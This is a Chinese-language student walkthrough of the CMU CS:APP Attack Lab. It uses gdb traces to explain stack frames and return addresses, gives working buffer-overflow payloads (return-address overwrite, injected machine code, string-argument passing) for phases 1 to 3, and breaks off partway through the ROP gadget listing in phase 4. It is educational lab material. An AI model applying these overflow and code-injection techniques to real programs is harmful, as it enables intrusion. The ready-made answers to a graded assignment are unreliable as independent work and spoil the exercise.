# 前置知识
call 指令
ret 指令
寄存器rip
栈
小端模式

**栈向下生长，栈顶在低地址，栈底在高地址**

**指令寄存器（RIP）包含下一条将要被执行的指令的逻辑地址。**

通常情况下，每取出一条指令后，RIP会自增指向下一条指令。在x86_64中RIP的自增也即偏移一定字节。（可通过disassemble 查看下一个地址，字节大小不一定等长）

但是RIP并不总是自增，也有例外，例如call 指令和ret指令。**call指令会将当前RIP的内容压入栈中，将程序的执行权交给目标函数；ret指令则执行出栈操作，将之前压入栈的8个字节的RIP地址弹出，重新放入RIP。**

更多信息参考
[X86/ARM 寄存器](https://www.cnblogs.com/tzj-kernel/p/17960135)
[[register]-ARMV8系统中通用寄存器和系统寄存器的介绍和总结](https://www.bilibili.com/opus/913806141088071748)

# 前置准备工作
下载实验包Attack Lab
可以在这个网站下下载 [Lab Assignments](https://csapp.cs.cmu.edu/3e/labs.html)

下载后的实验包名字应该是 target1.tar

在终端输入``tar -xvf target1.tar``解压
出来的文件应该有6个
```txt
target1/README.txt
target1/ctarget
target1/rtarget
target1/farm.c
target1/cookie.txt
target1/hex2raw
```

进入文件夹后在终端中分别输入
```txt
objdump -d ctarget > ctarget.d
objdump -d rtarget > rtarget.d
```
对两个攻击目标进行反汇编.

记得安装gcc等调试工具/环境

这里讲解的实验环境为：
虚拟机:VMware Workstation17
系统镜像: ubuntu-18.04.5-desktop-amd64.iso

# phase1
第一个阶段是攻击ctarget

首先要明白的是ctarget运行程序时候函数调用顺序是``main() -> ... -> test() -> getbuf()-> Gets()``
然后顺序返回，我们的目标是在``test()``函数调用``getbuf()``函数并且``getbuf()``函数结束后不返回``test()``函数，而是返回``touch1()``函数。

## 先断点观察
打开ctarget.d文件，ctrl+f查找``<test>``找到``test()``函数如下
```c
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
```
我们还能找到调用<test>函数的地方
```c  
  401f1f:	e8 44 fa ff ff       	callq  401968 <test>
  401f24:	83 3d bd 25 20 00 00 	cmpl   $0x0,0x2025bd(%rip)        # 6044e8 <is_checker>
```
打开终端依次输入
```txt
gdb ctarget
break getbuf
layout asm
layout regs
r -q
```
``gdb ctarget``反汇编ctarget可执行文件
``break getbuf``指令就是在``getbuf()``这个函数上打断点。
``layout asm / layout regs``分别是在屏幕上显示出当前汇编执行代码和寄存器
``r -q``r是run的意思表示运行程序，-q表示不向服务器端发送请求(因为这是国外的实验)
(注：layout asm ; layout regs这两条目前是可选选项)

这个时候输入``x/80xb $rsp``打印栈的内容发现401976地址(小端模式！)在栈顶，再往前看是401f24，这两个地址刚好都是分别调用完``getbuf()``函数和``test()``函数的下一个指令的地址。
```txt
(gdb) x/80xb $rsp
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

在调试界面中不断输入``ni``直到中间asm窗口到了``│0x4017bd <getbuf+21> retq``(也就是返回指令)，这个时候看寄存器窗口会发现rsp和rip都亮起。且状态如下
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x7ffff7af2031   140737348837425              │
│rdx            0x606671 6317681                            rsi            0x606670 6317680                            rdi            0x0      0                                    │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca0       0x5561dca0                 r8             0x7ffff7dcf8c0   140737351841984              │
│r9             0x7ffff7fe3540   140737354020160            r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017bd 0x4017bd <getbuf+21>               eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                                   │
│                                                                                                                                                                                   │
   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
  >│0x4017bd <getbuf+21>    retq                                                                                                                                                    │
   │0x4017be                nop                                                                                                                                                     │
   │0x4017bf                nop                                                                                                                                                     │
   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
native process 1903 In: getbuf                                                                                                                                    L16   PC: 0x4017bd 

(gdb) layout regs
(gdb) r -q
Starting program: /home/xiaojuer/experimet/target1/ctarget -q

Breakpoint 1, getbuf () at buf.c:12
(gdb) ni
(gdb) ref
(gdb) ni
(gdb) 
```
这时候rsp是0x5561dca0，再往下一步(也就是执行ret指令)，会发现把栈顶中(也就是0x5561dca0地址下)的8个字节读入了rip之中(也就是0x401971),具体寄存器如下图
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x7ffff7af2031   140737348837425              │
│rdx            0x606671 6317681                            rsi            0x606670 6317680                            rdi            0x0      0                                    │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca8       0x5561dca8                 r8             0x7ffff7dcf8c0   140737351841984              │
│r9             0x7ffff7fe3540   140737354020160            r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x401976 0x401976 <test+14>                 eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                  
```
到这里就解释了**ret指令则执行出栈操作，将之前压入栈的8个字节的RIP地址弹出，重新放入RIP。**
结合RIP寄存器的功能就可以得到``getbuf()``函数返回到``test()``函数的操作就是在``ret``这个指令这一步，其中重点是存放在栈顶(0x5561dca0)的**地址**称**为 (函数调用)返回地址**

阶段一的目标是返回到``touch1()``函数，自然就能想到，如果把返回地址改为``touch1()``函数的地址，那么就可以返回到``touch1()``函数。

## 制作答案
```c
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
注意到``getbuf()``函数中调用了``Gets()``函数，这个函数是将你的输入传入栈中。注意到前面``sub    $0x28,%rsp``，将栈指针减去了0x28字节，也就是开辟了栈空间。
那么结合刚刚的断点分析，可以得到返回地址在栈顶往高地址走0x28字节中。
```txt
(gdb) x/80xb $rsp
0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

所以我们需要用0x28个字节的垃圾信息填充满开辟的栈空间，然后再加上``touch1()``函数的地址，就能用``touch1()``函数的地址覆盖掉原来的返回地址。

**phase1.txt :**
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```
再次断点调试。
这个时候我们需要先用指令``./hex2raw < phase1.txt > test1.txt``
用自带的小工具将字符文件转换为二进制数据文件
然后就可以在gdb里面输入``r < test1.txt -q``进行运行。
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x5561dc78       1432476792                 rbx            0x55586000       1431855104                 rcx            0x6066a1 6317729                              │
│rdx            0xa      10                                 rsi            0x30     48                                 rdi            0x7ffff7dcda00   140737351834112              │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dc78       0x5561dc78                 r8             0x77     119                                  │
│r9             0x0      0                                  r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017b4 0x4017b4 <getbuf+12>               eflags         0x246    [ PF ZF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                                   │
│                                                                                                                                                                                   │
└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
  >│0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
   │0x4017bd <getbuf+21>    retq                                                                                                                                                    │
   │0x4017be                nop                                                                                                                                                     │
   │0x4017bf                nop                                                                                                                                                     │
   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
native process 2930 In: getbuf                                                                                                                                    L16   PC: 0x4017b4 
Starting program: /home/xiaojuer/experimet/target1/ctarget < test1.txt -q

Breakpoint 1, getbuf () at buf.c:12
(gdb) ni
(gdb) x/80xb $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
在调用完``Gets()``函数后用指令``x/80xb $rsp``查看栈中的内容，就可以发现0x5561dca0下存放的返回地址被覆盖成了``touch1()``函数的地址了。
而且要注意刚刚phase1.txt的内容其实就是在下面这几行地址里面了，从栈顶往下读入的，**如果到这一步发现内容和期望的不一致，大概率是转换出错或者名字打错了，需要检查前面步骤。**
```txt
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
```
接下来一步是``add $0x28,%rsp``，将刚刚开辟的0x28字节的空间释放回去了，所以如果仅仅是将返回地址放在上面0x28字节中是没有用的。
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x6066a1 6317729                              │
│rdx            0xa      10                                 rsi            0x30     48                                 rdi            0x7ffff7dcda00   140737351834112              │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca0       0x5561dca0                 r8             0x77     119                                  │
│r9             0x0      0                                  r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017bd 0x4017bd <getbuf+21>               eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                                   │
│                                                                                                                                                                                   │
   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
  >│0x4017bd <getbuf+21>    retq                                                                                                                                                    │
   │0x4017be                nop                                                                                                                                                     │
   │0x4017bf                nop                                                                                                                                                     │
   │0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                                        │
   └────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
native process 2930 In: getbuf                                                                                                                                    L16   PC: 0x4017bd 
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
(gdb) ni
(gdb) x/80xb $rsp 
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcc8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcd0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcd8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dce0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dce8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
执行完``add    $0x28,%rsp``之后就会发现``touch1()``函数的地址就在栈顶，然后执行``ret``指令，从栈顶中读取放在RIP里面就能跳转到``touch1()``函数了。
再次输入``ni``进行下一步查看就能看到程序进入到了``touch1()``函数中。至此答案解释结束。
```txt
┌──Register group: general──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│rax            0x1      1                                  rbx            0x55586000       1431855104                 rcx            0x6066a1 6317729                              │
│rdx            0xa      10                                 rsi            0x30     48                                 rdi            0x7ffff7dcda00   140737351834112              │
│rbp            0x55685fe8       0x55685fe8                 rsp            0x5561dca8       0x5561dca8                 r8             0x77     119                                  │
│r9             0x0      0                                  r10            0x606010 6316048                            r11            0x246    582                                  │
│r12            0x2      2                                  r13            0x0      0                                  r14            0x0      0                                    │
│r15            0x0      0                                  rip            0x4017c0 0x4017c0 <touch1>                  eflags         0x216    [ PF AF IF ]                         │
│cs             0x33     51                                 ss             0x2b     43                                 ds             0x0      0                                    │
│es             0x0      0                                  fs             0x0      0                                  gs             0x0      0                                    │
│k0             0x0      0                                  k1             0x0      0                                  k2             0x0      0                                    │
│k3             0x0      0                                  k4             0x0      0                                  k5             0x0      0                                    │
│k6             0x0      0                                  k7             0x0      0                                                                                               │
│                                                                                                                                                                                   │
│                                                                                                                                                                                   │
   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
B+ │0x4017a8 <getbuf>       sub    $0x28,%rsp                                                                                                                                       │
   │0x4017ac <getbuf+4>     mov    %rsp,%rdi                                                                                                                                        │
   │0x4017af <getbuf+7>     callq  0x401a40 <Gets>                                                                                                                                  │
   │0x4017b4 <getbuf+12>    mov    $0x1,%eax                                                                                                                                        │
   │0x4017b9 <getbuf+17>    add    $0x28,%rsp                                                                                                                                       │
   │0x4017bd <getbuf+21>    retq                                                                                                                                                    │
   │0x4017be                nop                                                                                                                                                     │
   │0x4017bf                nop                                                                                                                                                     │
  >│0x4017c0 <touch1>       sub    $0x8,%rsp                                                                                                                                        │
   │0x4017c4 <touch1+4>     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>                                                                                                   │
   │0x4017ce <touch1+14>    mov    $0x4030c5,%edi                                                                                                                                   │
   │0x4017d3 <touch1+19>    callq  0x400cc0 <puts@plt>                                                                                                                              │
   │0x4017d8 <touch1+24>    mov    $0x1,%edi                                                                                                                               
```

## 验证答案
用``cat phase1.txt | ./hex2raw | ./ctarget -q``指令验证答案
```txt
xiaojuer@ubuntu:~/experimet/target1$ cat phase1.txt | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```
其中``result``后面跟着 ``PASS``字样那么就是成功了。``ctarget:1:``后面跟着的是输入的phase1.txt(答案)。可以对比一下是否是你输入的答案从而确认没搞错。
顺便还得注意``Type string:Touch1!: You called touch1()``这一句，有这一句说明成功调用了``touch1()``函数，而不是其他函数。
# phase2
第二个阶段还是攻击ctarget

首先要明白的是ctarget运行程序时候函数调用顺序是``main() -> ... -> test() -> getbuf()-> Gets()``
然后顺序返回，我们的目标是在``test()``函数调用``getbuf()``函数并且``getbuf()``函数结束后不返回``test()``函数，而是返回``touch2()``函数。

并且``touch2()``函数里面有一个判断，是判断传入的第一个参数是否是cookie值。

每个人的cookie值放在了cookie.txt文件里面。打开后可以看见cookie值为:``0x59b997fa``

那么根据分析可得，需要将cookie值传入到第一个参数中，也就是把cookie值放在rdi寄存器(默认存放第一个参数的寄存器)里面再调用``touch2()``函数即可。

## 注入代码
把cookie值放在rdi寄存器里的汇编代码可以是：
**inc.s:**
```txt
mov $0x59b997fa , %rdi
ret
```

(注:为什么要注入代码？牢记目标流程:getbuf()函数->把cookie值放在rdi寄存器->成功调用touch2()函数)

新建一个inc.s文件然后把注入代码放入里面
再在终端输入指令进行编译``gcc -c inc.s``和反汇编``objdump -d inc.o > inc.asm``
```txt
xiaojuer@ubuntu:~/experimet/target1$ gcc -c inc.s
xiaojuer@ubuntu:~/experimet/target1$ objdump -d inc.o > inc.asm
```
就可以得到inc.asm文件
inc.asm:
```c

inc.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	c3                   	retq   
```
里面包含了刚刚想要的汇编代码``mov    $0x59b997fa,%rdi retq``，以及他的机器码``48 c7 c7 fa 97 b9 59 c3``。
那么就可以用机器码放在栈里面从而实现我们想要的汇编代码。

其实和之前看ctarget.d文件里面的内容是一样的原理
例如``getbuf()``函数
```c
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```
当rip寄存器是4017a8，那么下一步就会执行``48 83 ec 28``，刚好是一组合法的机器码，对应的汇编代码为``sub    $0x28,%rsp``。
因为机器码不易读，所以在asm窗口内就仅仅显示了汇编代码，没有显示底层的机器码(结合计算机内都是一堆数字(二进制/二进制转16进制为一组)就可以理解)。

根据phase1阶段解读的内容，阶段二实际上是阶段一的基础上加上了注入代码这一步。
我们可以把注入代码的机器码放在(任意？)位置，然后获取到其地址，就可以实现返回到我们想要执行的代码了。

例如下面的答案是把注入代码的机器码放在了第一行，因为前三个阶段的栈是同一个空间，所以查看就可以知道第一行对应的地址为``0x5561dc78``以此类推。
```txt
(gdb) x/80xb $rsp
0x5561dc78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc80:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0xc0    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
那么第一次的返回地址就是``0x5561dc78``，然后注入代码结尾还有一个``ret``指令，会从栈顶再读取一个地址，这个时候已经将cookie值放在了rdi里面了，再读取的地址为``touch2()``函数的地址就可以PASS这一阶段了。

**phase2:**
```txt
48 c7 c7 fa 97 b9 59 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
```
总流程 : test()函数 -> call指令 -> 栈顶放入返回地址 -> 调用getbuf()函数 - > 开辟空间 -> call指令调用Gets()函数读入数据(此时覆盖了之前放入的返回地址)并且ret返回 -> 释放空间 -> ret指令在栈顶读入 ``0x5561dc78`` 到 rip寄存器里 -> 执行地址``0x5561dc78``里面的指令(机器码组)``48 c7 c7 fa 97 b9 59 (mov    $0x59b997fa,%rdi , 将cookie值放入rdi里面)`` ``c3 (ret , 返回, ret指令在栈顶读入 touch2()函数的地址4017ec 到 rip寄存器里)`` -> 成功调用``touch2()``函数

理解了阶段一和阶段二这个流程后，就可以自己制作答案了。并且只要中间过程没有改变期望的内容，那么执行肯定是PASS的。
## 制作答案
答案还可以是:
```txt
c7 05 0e 2d 20 00 01 c3
48 c7 c7 fa 97 b9 59 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
5f c3 00 00 00 00 00 00
98 dc 61 55 00 00 00 00
fa 97 b9 59 00 00 00 00
ec 17 40 00 00 00 00 00
```

```txt
c7 05 0e 2d 20 00 01 c3
48 c7 c7 fa 97 b9 59 c3
00 00 00 00 00 00 00 00
58 97 c3 00 00 00 00 00
5f c3 00 00 00 00 00 00
90 dc 61 55 00 00 00 00
fa 97 b9 59 00 00 00 00
ec 17 40 00 00 00 00 00
```
...更简单 or 更复杂都可

只需要保证调用``touch2()``函数时候rdi里面存放的是cookie值即可。更多答案可以自己尝试。

# phase3
阶段三还是攻击**ctarget**
## 参考流程
阶段三和阶段二不同的点是调用函数为``touch3()``并且传入第一个参数为cookie字符串,因为C语言中传入字符串实际上是传入地址。
所以流程为: [把cookie字符串转为ASCLL码](https://www.asciim.cn/m/tools/convert_string_to_ascii.html) -> 将字符串放在(在成功调用touch3()里面比较指令前都不会被修改的)内存中 -> 把字符串的内容地址放在rdi寄存器中 -> 成功调用``touch3()``函数

**推荐把字符串放在调用``touch3()``函数地址后面，这样可以确保不会被修改。**

如果说前两个阶段都是学习，第三个阶段就是检测成果。
不会的话可以参考(例如)：
```txt
<第一个返回地址>：<pop %rdi , ret>
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
<第一个返回地址>
<字符串地址>
<touch3()函数地址>
<字符串地址>:35 39 62 39 39 37 66 61
```
还可以：
```txt
<第一个返回地址>：<mov $<字符串地址>,%rdi , ret>
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
<第一个返回地址>
<touch3()函数地址>
<字符串地址>:35 39 62 39 39 37 66 61
```

看不太懂的话可以参考一下下面的阶段二然后试图解读：
**phase2:**
```txt
48 c7 c7 fa 97 b9 59 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
```
对应的是:
```txt
<第一个返回地址>：<mov $<cookie值>,%rdi , ret>
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
<第一个返回地址>
<touch2()函数地址>
```

## 自制答案

这是稍微修改阶段二某个答案形成的阶段三的答案，请自行试图解读，不会的话可以按照上面教程动态调试。
```txt
c7 05 0e 2d 20 00 01 c3
48 c7 c7 fa 97 b9 59 c3
00 00 00 00 00 00 00 00
58 97 c3 00 00 00 00 00
5f c3 00 00 00 00 00 00
90 dc 61 55 00 00 00 00
b8 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```

# phase4
在阶段四我们需要用ROP攻击方式去攻击**rtarget**
前三个阶段都是攻击**ctarget**
## 前置知识
ROP的全称为Return-oriented programming（返回导向编程）
可以稍微略读一下[基本ROP讲解](https://zhuanlan.zhihu.com/p/137144976)的前面部分。

其主要思想是在 **栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**

注意重点1：栈缓冲区溢出的基础上

注意重点2：程序中已有的小片段

第四和第五个阶段可用的片段为：从``start_farm()``函数开始到``end_farm()``结束中间所有的代码片段。具体如下farm.d文件(自己建立的,实际片段可以在rtarget.d文件(如果没有此文件请看前置工作内容)里面查找)
farm.d:
```c

0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
